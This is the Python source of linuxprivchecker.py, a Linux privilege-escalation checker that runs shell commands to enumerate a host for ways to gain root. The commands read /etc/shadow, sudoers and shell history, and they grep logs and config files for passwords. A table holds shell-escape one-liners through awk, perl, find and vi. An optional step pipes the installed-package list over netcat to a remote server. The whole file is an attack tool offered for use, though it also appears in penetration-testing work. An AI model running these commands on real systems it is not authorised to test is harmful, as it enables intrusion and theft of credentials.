#!/usr/bin/env python3

###############################################################################################################
## [Title]: linuxprivchecker.py -- a Linux Privilege Escalation Check Script for python 3
## [Original Author]: Mike Czumak (T_v3rn1x) -- @SecuritySift
## [Updater]: Mike Merrill (linted)
##-------------------------------------------------------------------------------------------------------------
## [Details]:
## This script is intended to be executed locally on a Linux box to enumerate basic system info and
## search for common privilege escalation vectors such as world writable files, misconfigurations, clear-text
## passwords and applicable exploits.
##-------------------------------------------------------------------------------------------------------------
## [Warning]:
## This script comes as-is with no promise of functionality or accuracy.
##-------------------------------------------------------------------------------------------------------------
## [Modification, Distribution, and Attribution]:
## You are free to modify and/or distribute this script as you wish.  I only ask that you maintain original
## author attribution and not attempt to sell it or incorporate it into any commercial offering.
###############################################################################################################

# conditional import for older versions of python not compatible with subprocess
from concurrent import futures
from functools import partial


try:
    from asyncio import (
        create_subprocess_shell,
        get_running_loop,
        subprocess,
        wait,
        run,
        FIRST_COMPLETED,
    )
except ImportError:
    print(
        "[-] Import Error: This version of python does not have the required libraries"
    )


async def getCmdResults(cmd, task):
    results = await task
    stdout = await results.stdout.read()
    output = stdout.decode().strip().split("\n")

    return (cmd, output)


# loop through dictionary, execute the commands, store the results, return updated dict
async def execCmd(cmdDict):
    futures = []
    for item in cmdDict:
        cmd = cmdDict[item]["cmd"]
        futures.append(
            getCmdResults(
                item,
                create_subprocess_shell(
                    cmd,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                ),
            )
        )

    todo = futures
    while len(todo) > 0:
        done, todo = await wait(todo, return_when=FIRST_COMPLETED)
        for task in done:
            # print(dir(task.result()))
            try:
                item, results = task.result()
            except Exception as e:
                item = e
                results = ["[-] failed: {}".format(e)]
            cmdDict[item]['results'] = results
    printResults(cmdDict)


# print results for each previously executed command, no return value
def printResults(cmdDict):
    output = ''
    for item in cmdDict:
        msg = cmdDict[item]["msg"]
        results = cmdDict[item]["results"]
        output += "[+] {}\n".format(msg)
        for result in results:
            if result.strip() != "":
                output += "    {}\n".format(result.rstrip())
    print(output)


def parseAppProc():
    procs = getAppProc["PROCS"]["results"]
    pkgs = getAppProc["PKGS"]["results"]
    supusers = userInfo["SUPUSERS"]["results"]
    procdict = {}  # dictionary to hold the processes running as super users

    for proc in procs:  # loop through each process
        relatedpkgs = []  # list to hold the packages related to a process
        try:
            for user in supusers:  # loop through the known super users
                if (user != "") and (
                    user in proc
                ):  # if the process is being run by a super user
                    procname = proc.split(" ")[4]  # grab the process name
                if "/" in procname:
                    splitname = procname.split("/")
                    procname = splitname[len(splitname) - 1]
                    for pkg in pkgs:  # loop through the packages
                        if (
                            not len(procname) < 3
                        ):  # name too short to get reliable package results
                            if procname in pkg:
                                if procname in procdict:
                                    relatedpkgs = procdict[
                                        proc
                                    ]  # if already in the dict, grab its pkg list
                                if pkg not in relatedpkgs:
                                    relatedpkgs.append(pkg)  # add pkg to the list
                                procdict[
                                    proc
                                ] = relatedpkgs  # add any found related packages to the process dictionary entry
        except:
            pass

    for key in procdict:
        print("    " + key)  # print the process name
        try:
            if (
                not procdict[key][0] == ""
            ):  # only print the rest if related packages were found
                print("        Possible Related Packages: ")
                for entry in procdict[key]:
                    print("            " + entry)  # print each related package
        except:
            pass


def parseDevTools():
    for cmd in escapeCmd:
        for result in devTools["TOOLS"]["results"]:
            if cmd in result:
                for item in escapeCmd[cmd]:
                    print("    " + cmd + "-->\t" + item)


async def vulnLookup():
    question = input("[?] Would you like to search for possible exploits? [y/N] ")
    if "y" in question.lower():
        server = input("[?] What is the address of the server? ")
        port = input("[?] What port is the server using? ")
        print("[ ] Connecting to {}:{}".format(server, port))
        exploits = {
            "EXPLOITS": {
                "cmd": "dpkg -l | tail -n +6 | awk '{{print $2, $3}} END {{print \"\"}}' | nc {} {}".format(
                    server, port
                ),
                "msg": "Found the following possible exploits",
            }
        }
        await execCmd(exploits)



sysInfo = {
    "OS": {"cmd": "cat /etc/issue", "msg": "Operating System"},
    "KERNEL": {"cmd": "cat /proc/version", "msg": "Kernel"},
    "HOSTNAME": {"cmd": "hostname", "msg": "Hostname"},
}


netInfo = {
    "NETINFO": {"cmd": "/sbin/ifconfig -a", "msg": "Interfaces"},
    "ROUTE": {"cmd": "route", "msg": "Route"},
    "NETSTAT": {"cmd": "netstat -antup | grep -v 'TIME_WAIT'", "msg": "Netstat"},
    "IP_Adder": {"cmd": "ip addr", "msg": "ip addr"},
    "IP_Route": {"cmd": "ip route", "msg": "ip route"},
    "SS": {"cmd": "ss -antup", "msg": "ss"},
}


driveInfo = {
    "MOUNT": {"cmd": "mount", "msg": "Mount results"},
    "FSTAB": {"cmd": "cat /etc/fstab 2>/dev/null", "msg": "fstab entries"},
}


cronInfo = {
    "CRON": {"cmd": "ls -la /etc/cron* 2>/dev/null", "msg": "Scheduled cron jobs"},
    "CRONW": {
        "cmd": "ls -aRl /etc/cron* 2>/dev/null | awk '$1 ~ /w.$/' 2>/dev/null",
        "msg": "Writable cron dirs",
    },
}


userInfo = {
    "WHOAMI": {"cmd": "whoami", "msg": "Current User"},
    "ID": {"cmd": "id", "msg": "Current User ID"},
    "ALLUSERS": {"cmd": "cat /etc/passwd", "msg": "All users"},
    "SUPUSERS": {
        "cmd": "grep -v -E '^#' /etc/passwd | awk -F: '$3 == 0{print $1}'",
        "msg": "Super Users Found:",
    },
    "HISTORY": {
        "cmd": "ls -la ~/.*_history; ls -la /root/.*_history 2>/dev/null",
        "msg": "Root and current user history (depends on privs)",
    },
    "ENV": {"cmd": "env 2>/dev/null | grep -v 'LS_COLORS'", "msg": "Environment"},
    "SUDOERS": {
        "cmd": "cat /etc/sudoers 2>/dev/null | grep -v '#' 2>/dev/null",
        "msg": "Sudoers (privileged)",
    },
    "SUDO":{
        "cmd": "sudo -nl",
        "msg": "Current user's sudo permissions",
    },
    "LOGGEDIN": {"cmd": "w 2>/dev/null", "msg": "Logged in User Activity"},
}


fdPerms = {
    "WWDIRSROOT": {
        "cmd": "find / \( -type d -perm -o+w \) -exec ls -ld '{}' ';' 2>/dev/null | grep root",
        "msg": "World Writeable Directories for User/Group 'Root'",
    },
    "WWDIRS": {
        "cmd": "find / \( -type d -perm -o+w \) -exec ls -ld '{}' ';' 2>/dev/null | grep -v root",
        "msg": "World Writeable Directories for Users other than Root",
    },
    "WWFILES": {
        "cmd": "find / \( -wholename '/proc/*' -prune \) -o \( -type f -perm -o+w \) -exec ls -l '{}' ';' 2>/dev/null",
        "msg": "World Writable Files",
    },
    "SUID": {
        "cmd": "find / \( -perm -2000 -o -perm -4000 \) -exec ls -ld {} \; 2>/dev/null",
        "msg": "SUID/SGID Files and Directories",
    },
    "ROOTHOME": {
        "cmd": "ls -ahlR /root 2>/dev/null",
        "msg": "Checking if root's home folder is accessible",
    },
}


pwdFiles = {
    "LOGPWDS": {
        "cmd": "find /var/log -name '*.log' 2>/dev/null | xargs -l10 egrep 'pwd|password' 2>/dev/null",
        "msg": "Logs containing keyword 'password'",
    },
    "CONFPWDS": {
        "cmd": "find /etc -name '*.c*' 2>/dev/null | xargs -l10 egrep 'pwd|password' 2>/dev/null",
        "msg": "Config files containing keyword 'password'",
    },
    "SHADOW": {"cmd": "cat /etc/shadow 2>/dev/null", "msg": "Shadow File (Privileged)"},
}


getAppProc = {
    "PROCS": {
        "cmd": "ps aux | awk '{print $1,$2,$9,$10,$11}'",
        "msg": "Current processes",
    },
    "PKGS": {"cmd": "", "msg": "Installed Packages"},
}


otherApps = {
    "SUDO": {
        "cmd": "sudo -V | grep version 2>/dev/null",
        "msg": "Sudo Version (Check out http://www.exploit-db.com/search/?action=search&filter_page=1&filter_description=sudo)",
    },
    "APACHE": {
        "cmd": "apache2 -v; apache2ctl -M; httpd -v; apachectl -l 2>/dev/null",
        "msg": "Apache Version and Modules",
    },
    "APACHECONF": {
        "cmd": "cat /etc/apache2/apache2.conf 2>/dev/null",
        "msg": "Apache Config File",
    },
}


devTools = {
    "TOOLS": {
        "cmd": "which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp 2>/dev/null",
        "msg": "Installed Tools",
    }
}


escapeCmd = {
    "vi": [":!bash", ":set shell=/bin/bash:shell"],
    "awk": ["awk 'BEGIN {system(\"/bin/bash\")}'"],
    "perl": ["perl -e 'exec \"/bin/bash\";'"],
    "find": ["find / -exec /usr/bin/awk 'BEGIN {system(\"/bin/bash\")}' \\;"],
    "nmap": ["--interactive"],
}


async def main():
    print("{0}\nLINUX PRIVILEGE ESCALATION CHECKER\n{0}".format("=" * 80))

    # Basic system info
    print("[*] GETTING BASIC SYSTEM INFO...\n")
    await execCmd(sysInfo)

    # Networking Info
    print("[*] GETTING NETWORKING INFO...\n")
    await execCmd(netInfo)

    # File System Info
    print("[*] GETTING FILESYSTEM INFO...\n")
    await execCmd(driveInfo)

    # Scheduled Cron Jobs
    print("[*] GETTING CRON JOB INFO... \n")
    await execCmd(cronInfo)

    # User Info
    print("\n[*] ENUMERATING USER AND ENVIRONMENTAL INFO...\n")
    await execCmd(userInfo)

    if "root" in userInfo["ID"]["results"][0]:
        print("[!] ARE YOU SURE YOU'RE NOT ROOT ALREADY?\n")

    # File/Directory Privs
    print("[*] ENUMERATING FILE AND DIRECTORY PERMISSIONS/CONTENTS...\n")
    await execCmd(fdPerms)

    await execCmd(pwdFiles)

    # Processes and Applications
    print("[*] ENUMERATING PROCESSES AND APPLICATIONS...\n")
    if (
        "debian" in sysInfo["KERNEL"]["results"][0]
        or "ubuntu" in sysInfo["KERNEL"]["results"][0]
    ):
        getAppProc["PKGS"]["cmd"] = "dpkg -l | awk '{$1=$4=\"\"; print $0}'"  # debian
    else:
        getAppProc["PKGS"]["cmd"] = "rpm -qa | sort -u"  # RH/other
    await execCmd(getAppProc)
    await execCmd(otherApps)

    print(
        "[*] IDENTIFYING PROCESSES AND PACKAGES RUNNING AS ROOT OR OTHER SUPERUSER...\n"
    )
    parseAppProc()

    # First discover the avaialable tools
    print("\n[*] ENUMERATING INSTALLED LANGUAGES/TOOLS FOR SPLOIT BUILDING...\n")
    await execCmd(devTools)

    print("[+] Related Shell Escape Sequences...\n")
    # find the package information for the processes currently running
    # under root or another super user
    parseDevTools()

    print("[*] FINDING RELEVENT PRIVILEGE ESCALATION EXPLOITS...\n")
    await vulnLookup()

    print("\n[+] Finished")
    print("=" * 80)


if __name__ == "__main__":
    run(main())